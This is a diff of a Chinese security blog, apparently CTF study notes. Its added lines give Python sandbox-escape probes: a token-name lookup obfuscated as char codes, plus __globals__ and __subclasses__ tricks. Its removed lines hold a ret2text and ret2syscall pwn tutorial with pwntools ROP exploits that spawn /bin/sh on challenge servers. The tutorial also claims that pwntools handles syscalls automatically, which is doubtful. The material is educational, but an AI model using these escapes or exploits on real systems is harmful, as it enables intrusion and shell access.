+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> n: <span class="number">1</span> <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="built_in">str</span>(<span class="built_in">globals</span>()[n])[<span class="number">0</span>]) &gt; <span class="number">100</span> <span class="keyword">else</span> <span class="number">1</span>/<span class="number">0</span>)(<span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">83</span>,<span class="number">69</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">78</span>,<span class="number">95</span>,<span class="number">84</span>,<span class="number">79</span>,<span class="number">75</span>,<span class="number">69</span>,<span class="number">78</span>]))</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="8-AST-白名单类"><a href="#8-AST-白名单类" class="headerlink" title="8. AST 白名单类"></a>8. AST 白名单类</h1><h2 id="适用条件-7"><a href="#适用条件-7" class="headerlink" title="适用条件"></a>适用条件</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">不是简单字符串黑名单</span><br><span class="line">而是 ast.parse 后检查节点类型</span><br><span class="line">只允许部分语法</span><br></pre></td></tr></table></figure>
+
+<h2 id="先测节点"><a href="#先测节点" class="headerlink" title="先测节点"></a>先测节点</h2><p>按顺序测试：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>+<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;a&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;a&quot;</span>+<span class="string">&quot;b&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">len</span>(<span class="string">&quot;a&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">1</span>]]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> x:x)(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="9-globals-builtins-被限制类"><a href="#9-globals-builtins-被限制类" class="headerlink" title="9. globals &#x2F; builtins 被限制类"></a>9. globals &#x2F; builtins 被限制类</h1><h2 id="适用条件-8"><a href="#适用条件-8" class="headerlink" title="适用条件"></a>适用条件</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">globals 不可用</span><br><span class="line">locals 不可用</span><br><span class="line">vars 不可用</span><br><span class="line">__builtins__ 被删或不完整</span><br><span class="line">普通模板全失效</span><br></pre></td></tr></table></figure>
+
+<h2 id="首选方向-A：从函数对象找全局环境"><a href="#首选方向-A：从函数对象找全局环境" class="headerlink" title="首选方向 A：从函数对象找全局环境"></a>首选方向 A：从函数对象找全局环境</h2><p>如果环境里存在函数对象 <code>f</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(f.__globals__)</span><br></pre></td></tr></table></figure>
+
+<p>如果能拿到函数全局环境：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(f.__globals__[<span class="string">&quot;__builtins__&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+<h2 id="首选方向-B：从对象模型找可用类"><a href="#首选方向-B：从对象模型找可用类" class="headerlink" title="首选方向 B：从对象模型找可用类"></a>首选方向 B：从对象模型找可用类</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">object</span>.__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;warning&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(c).lower():</span><br><span class="line">        <span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>
+
+<h2 id="首选方向-C：搜索可用类名"><a href="#首选方向-C：搜索可用类名" class="headerlink" title="首选方向 C：搜索可用类名"></a>首选方向 C：搜索可用类名</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">object</span>.__subclasses__():</span><br><span class="line">    name = <span class="built_in">str</span>(c).lower()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;file&quot;</span> <span class="keyword">in</span> name <span class="keyword">or</span> <span class="string">&quot;warning&quot;</span> <span class="keyword">in</span> name <span class="keyword">or</span> <span class="string">&quot;import&quot;</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -1681,230 +1881,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/03/02/ret2syscall/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="linkpwn">
-      <meta itemprop="description" content="linkpwn的学习经历">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="网络幻影">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/03/02/ret2syscall/" class="post-title-link" itemprop="url">ret2syscall</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-03-02 04:17:51" itemprop="dateCreated datePublished" datetime="2025-03-02T04:17:51+08:00">2025-03-02</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-02-26 15:58:27" itemprop="dateModified" datetime="2026-02-26T15:58:27+08:00">2026-02-26</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/stack/" itemprop="url" rel="index"><span itemprop="name">stack</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/stack/ret2syscall/" itemprop="url" rel="index"><span itemprop="name">ret2syscall</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="PWN中栈溢出的部分简单题型"><a href="#PWN中栈溢出的部分简单题型" class="headerlink" title="PWN中栈溢出的部分简单题型"></a>PWN中栈溢出的部分简单题型</h2><h3 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h3><p>这类题型里：</p>
-<p>1、存在能够覆盖返回地址的栈溢出</p>
-<p>2、程序代码中直接存在类似于**system(“bin&#x2F;sh”)**能够直接获取程序控制权的代码。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这段代码向系统申请一个sh的用户shell，可以获得当前交互主机的控制权bash</span><br></pre></td></tr></table></figure>
-
-
-
-<p>造成栈溢出的最常见的情形：</p>
-<p>1、gets()，由于gets()函数不限制读入的长度，所以一般看到程序中出现了gets()读取用户输入的情况，大概率是存在栈溢出的。</p>
-<p>2、限制长度读入函数，规定读入的长度大于变量与rbp&#x2F;ebp之间的距离，例如下图：</p>
-<p><img src="/2025/03/02/ret2syscall/Clip_2024-12-04_16-53-33.png" alt="Clip_2024-12-04_16-53-33"></p>
-<p>虽然read(0,buf,0x32uLL)限制了向buf内读入的长度为0x32，但是buf与rbp之间的距离只有0xA，就存在0x32-0xA&#x3D;0x28的长度是可以溢出的。</p>
-<h4 id="例题1："><a href="#例题1：" class="headerlink" title="例题1："></a>例题1：</h4><p>CTFshow - pwn38</p>
-<p>64位ret2text</p>
-<p>pwn基本解题流程：</p>
-<p>1、checksec检查程序基本信息：</p>
-<p>2、为程序添加可执行权：</p>
-<p>chmod +x pwn</p>
-<p>3、IDA反编译分析程序结构。</p>
-<p>4、gdb动态分析、调试。</p>
-<p>5、编写攻击脚本exp。</p>
-<p>checksec查看程序基本信息：</p>
-<p><img src="/2025/03/02/ret2syscall/Clip_2024-12-04_17-38-43.png" alt="Clip_2024-12-04_17-38-43"></p>
-<p>IDA反编译分析：</p>
-<p>主函数：</p>
-<p>存在0x32-0xA &#x3D; 0x28长度的栈溢出。</p>
-<p><img src="/2025/03/02/ret2syscall/Clip_2024-12-04_17-02-34.png" alt="Clip_2024-12-04_17-02-34"></p>
-<p>后门函数：</p>
-<p>存在system(“&#x2F;bin&#x2F;sh”)</p>
-<p><img src="/2025/03/02/ret2syscall/image-20240514131905819.png" alt="image-20240514131905819"></p>
-<img src="/2025/03/02/ret2syscall/Clip_2024-12-04_17-10-38.png" alt="Clip_2024-12-04_17-10-38" style="zoom:50%;">
-
-<p>gdb调试：</p>
-<p>在这道题中：</p>
-<p>0x7fffffffdc00是buf的起始地址，大小为0xA，rbp是buf+0xA 也就是图中的0x7fffffffdc10，而紧跟着rbp后面的就是函数的返回地址，ret address，我们只需要通过栈溢出将ret address改写成我们想要让程序返回的地方即可达到攻击的目的。</p>
-<p><img src="/2025/03/02/ret2syscall/Clip_2024-12-04_17-15-39.png" alt="Clip_2024-12-04_17-15-39"></p>
-<p>编写攻击脚本exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28308</span>)<span class="comment">#与远程建立连接。</span></span><br><span class="line"></span><br><span class="line">io.recv()<span class="comment">#接收程序的输出</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x400287</span> <span class="comment">#ROPgadget --binary pwn --only &quot;ret&quot;，用于寻找程序中的ret指令的地址。</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> *(<span class="number">0xA</span>+<span class="number">8</span>) +p64(ret)+ p64(<span class="number">0x400657</span>)</span><br><span class="line"><span class="comment">#用（0xA+8）长度的垃圾数据&#x27;A&#x27;来填充距离，再接上p64(ret)进行堆栈平衡,最后接上后门函数的地址。</span></span><br><span class="line">io.sendline(payload)<span class="comment">#发送构造的payload</span></span><br><span class="line">io.interactive()<span class="comment">#进入交互模式</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="例题2："><a href="#例题2：" class="headerlink" title="例题2："></a>例题2：</h4><p>CTFshow——pwn37</p>
-<p>32位ret2text</p>
-<p>与64位原理一样，要修改成32位的格式:</p>
-<p><img src="/2025/03/02/ret2syscall/Clip_2024-12-04_17-35-34.png" alt="Clip_2024-12-04_17-35-34"></p>
-<p>exp:</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;pwn.challenge.ctf.show&quot;,28308)#与远程建立连接。</span></span><br><span class="line"></span><br><span class="line">io.recv()<span class="comment">#接收程序的输出</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x08048356</span> <span class="comment">#ROPgadget --binary pwn --only &quot;ret&quot;，用于寻找程序中的ret指令的地址。</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> *(<span class="number">0x12</span>+<span class="number">4</span>) + p32(ret) + p32(<span class="number">0x08048521</span>)</span><br><span class="line"><span class="comment">#用（0x12+4）长度的垃圾数据&#x27;A&#x27;来填充距离，再接上p32(ret)进行堆栈平衡,最后接上后门函数的地址。</span></span><br><span class="line">io.sendline(payload)<span class="comment">#发送构造的payload</span></span><br><span class="line">io.interactive()<span class="comment">#进入交互模式</span></span><br></pre></td></tr></table></figure>
-
-<p>不同点在于p32()以及ebp的长度由8变为4。</p>
-<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><h4 id="x32"><a href="#x32" class="headerlink" title="x32"></a>x32</h4><p>ctfshow pwn入门 pwn71</p>
-<p>栈溢出</p>
-<p><img src="/2025/03/02/ret2syscall/image-20240517134955943.png" alt="image-20240517134955943"></p>
-<p>静态编译，可以通过ret2syscall</p>
-<p>我们可以利用程序中的 gadgets 来获得shell，而对应的 shell 获取则是利用系统调用。<br>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shel</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,NULL,NULL)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">其中，该程序是 32 位，所以我们需要使得</span><br><span class="line">系统调用号，pop eax 0xb ret | 即 eax 应该为32位execve的进程号0xb</span><br><span class="line">第一个参数，pop ebx /bin/sh ret | 即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，pop ecx 0 ret | 即 ecx 应该为 0 </span><br><span class="line">第三个参数，pop edx 0 ret | 即 edx 应该为 0 </span><br><span class="line">最后，     int 0x80 | x86 通过 int 0x80 指令进行系统调用</span><br></pre></td></tr></table></figure>
-
-<p>我们需要pop eax ret，pop ebx ret ,pop ecx ret ,pop edx ret</p>
-<p>&#x2F;bin&#x2F;sh的地址：</p>
-<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-19-55.png" alt="Clip_2025-01-20_14-19-55"></p>
-<p><img src="/2025/03/02/ret2syscall/image-20240517135045415.png" alt="image-20240517135045415"></p>
-<p>这个可以利用</p>
-<p><img src="/2025/03/02/ret2syscall/image-20240517135156006.png" alt="image-20240517135156006"></p>
-<p>还有int 0x80</p>
-<p><img src="/2025/03/02/ret2syscall/image-20240517135849625.png" alt="image-20240517135849625"></p>
-<p>在ida中的偏移有问题，要在gdb中动调算:</p>
-<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-30-35.png" alt="Clip_2025-01-20_14-30-35"></p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28113</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x6C</span> + <span class="number">4</span></span><br><span class="line">pop_eax = <span class="number">0x080bb196</span> <span class="comment"># pop eax ; ret</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span> <span class="comment"># pop edx ; pop ecx ; pop ebx ; ret</span></span><br><span class="line">bin_sh = <span class="built_in">next</span>(elf.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">int_80h = <span class="number">0x08049421</span> <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = flat([&#x27;A&#x27;*offset,pop_eax,0xb,pop_edx_ecx_ebx,0,0,bin_sh,int_80h])</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*offset + p32(pop_eax) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh) +p32(int_80h)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="x32-2"><a href="#x32-2" class="headerlink" title="x32-2"></a>x32-2</h4><p>ctfshow Pwn入门 pwn72</p>
-<p>32位ret2syscall，没有&#x2F;bin&#x2F;sh，利用read读入</p>
-<p>计算偏移，这里ida的偏移又是错的，应该是0x28</p>
-<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-40-18.png" alt="Clip_2025-01-20_14-40-18"></p>
-<p>和之前一样，不同的地方是这次没有了&#x2F;bin&#x2F;sh</p>
-<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-41-01.png" alt="Clip_2025-01-20_14-41-01"></p>
-<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-41-18.png" alt="Clip_2025-01-20_14-41-18"></p>
-<p>在ida里面找到了read函数，可以利用read读入&#x2F;bin&#x2F;sh到bss段的一个地址，之后再ret2syscall时用这个地址即可</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">read()：</span><br><span class="line">  ssize_t read(int fd,const void *buf,size_t nbytes); </span><br><span class="line">  //fd 为要读取的文件的描述符  0</span><br><span class="line">  //buf 为要读取的数据的缓冲区地址 </span><br><span class="line">  //nbytes 为要读取的数据的字节数</span><br><span class="line"></span><br><span class="line">  //read() 函数会从 fd 文件中读取 nbytes 个字节并保存到缓冲区 buf，</span><br><span class="line"> //成功则返回读取到的字节数（但遇到文件结尾则返回0），失败则返回 -1。</span><br><span class="line"> </span><br><span class="line">调用号：sys_read 的32位调用号 为 3 | 64位进程号为0</span><br></pre></td></tr></table></figure>
-
-<p>那么我们可以构造调用read的rop</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop eax 0x3 ret #32位下read系统调用号</span><br><span class="line">pop ebx 0 ret   #要读取的内容描述，0</span><br><span class="line">pop ecx adress ret #adress是需要读入的地址</span><br><span class="line">pop edx length ret #读入的长度</span><br><span class="line">int 0x80 #执行系统调用</span><br></pre></td></tr></table></figure>
-
-<p>这题写入地址就随便选一个bss段上就行0x080EB000,读入长度，”&#x2F;bin&#x2F;sh\x00”，不少于这个就行</p>
-<p>之后再进行execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)的调用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">其中，该程序是 32 位，所以我们需要使得</span><br><span class="line">系统调用号，pop eax 0xb ret | 即 eax 应该为32位execve的进程号0xb</span><br><span class="line">第一个参数，pop ebx /bin/sh ret | 即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，pop ecx 0 ret | 即 ecx 应该为 0 </span><br><span class="line">第三个参数，pop edx 0 ret | 即 edx 应该为 0 </span><br><span class="line">最后，     int 0x80 | x86 通过 int 0x80 指令进行系统调用</span><br></pre></td></tr></table></figure>
-
-<p>这题不知道为什么ROPgadget找到的int 80h用不了，用的是ida这里的</p>
-<p>ROPgadget找到的这个用不了</p>
-<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-44-12.png" alt="Clip_2025-01-20_14-44-12"></p>
-<p>ida里面的这个可以用</p>
-<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-44-56.png" alt="Clip_2025-01-20_14-44-56"></p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28298</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x28</span>+<span class="number">4</span></span><br><span class="line">pop_eax = <span class="number">0x080bb2c6</span> <span class="comment"># pop eax ; ret</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806ecb0</span> <span class="comment"># pop edx ; pop ecx ; pop ebx ; ret</span></span><br><span class="line"><span class="comment">#bin_sh = next(elf.search(b&quot;/bin/sh&quot;))</span></span><br><span class="line">int_80h = <span class="number">0x0806F350</span> <span class="comment"># int 0x80</span></span><br><span class="line">bss = <span class="number">0x080EB000</span></span><br><span class="line"><span class="comment">#payload = flat([&#x27;A&#x27;*offset,pop_eax,0x3,pop_edx_ecx_ebx,0x10,bss,0,pop_eax,pop_edx_ecx_ebx,0,0,bss,int_80h])</span></span><br><span class="line">payload  = <span class="string">b&#x27;A&#x27;</span> *offset</span><br><span class="line">payload += p32(pop_eax) + p32(<span class="number">0x3</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx) + p32(<span class="number">0x10</span>) + p32(bss) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(int_80h)</span><br><span class="line"></span><br><span class="line">payload += p32(pop_eax) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss)</span><br><span class="line">payload += p32(int_80h)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h4 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h4><p>ctfshow pwn入门 pwn78</p>
-<p>没有canary没有pie</p>
-<p><img src="/2025/03/02/ret2syscall/image-20240524102221261.png" alt="image-20240524102221261"></p>
-<p>溢出函数</p>
-<p><img src="/2025/03/02/ret2syscall/image-20240524102839743.png" alt="image-20240524102839743"></p>
-<p>和32位类似，只是放参数的寄存器和调用号什么的变了,64位传参顺序是rdi &gt; rsi &gt; rdx &gt; rcx &gt; r8 &gt; r9 &gt; 栈上</p>
-<p>这题先调用read读入&#x2F;bin&#x2F;sh到bss段，再调用system(&#x2F;bin&#x2F;sh)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">调用read：</span><br><span class="line">pop rax 0 ret #将要调用的函数（read）的系统调用号存入rax(特殊，系统调用号就是放在rax里的)中，这里是0</span><br><span class="line">pop rdi 0 ret #read的第一个参数，表示标准读入</span><br><span class="line">pop rsi bss_addr ret #第二个参数，存放读入的位置，这里是bss上的一个地址</span><br><span class="line">pop rdx 0x10 ret #第三个参数，表示读入的长度，这里用0x10</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">调用execve(&quot;/bin/sh&quot;,NULL,NULL):</span><br><span class="line">pop rax 0x3b ret #execve的系统调用号，存入rax</span><br><span class="line">pop rdi bss_addr ret #将第一个参数/bin/sh,这里存在bss上，放入rdi中</span><br><span class="line">pop rsi 0 ret #第二个参数 0也就是NULL</span><br><span class="line">pop rdx 0 ret #第三个参数 0也就是NULL</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-
-<p>在实际利用中可以省略syscall，因为使用了pwntools库的<code>remote</code>函数时，它会自动处理系统调用，因此你不需要手动添加<code>syscall</code>指令。当你发送payload时，pwntools会在内部自动构造ROP链，并执行<code>syscall</code>指令以触发系统调用。因此，即使没有明确写出<code>syscall</code>指令，<code>read</code>和<code>execve</code>系统调用仍然会被正确地触发。但是这题不知道为什么还是要加syscall 。</p>
-<p>syscall ret地址：</p>
-<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_15-18-11.png" alt="Clip_2025-01-20_15-18-11"></p>
-<p>首先利用ROPgadget找到能利用的rop指令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only <span class="string">&quot;pop|ret&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>首先是 pop rax ret </p>
-<p><img src="/2025/03/02/ret2syscall/image-20240524112906565.png" alt="image-20240524112906565"></p>
-<p>然后是pop rdi ret</p>
-<p><img src="/2025/03/02/ret2syscall/image-20240524112513371.png" alt="image-20240524112513371"></p>
-<p>再是rsi和rdx，可以找到两个一起的</p>
-<p><img src="/2025/03/02/ret2syscall/image-20240524113021888.png" alt="image-20240524113021888"></p>
-<p>还需要一个单独的ret，需要在read调用完之后ret再调用下一个函数execve</p>
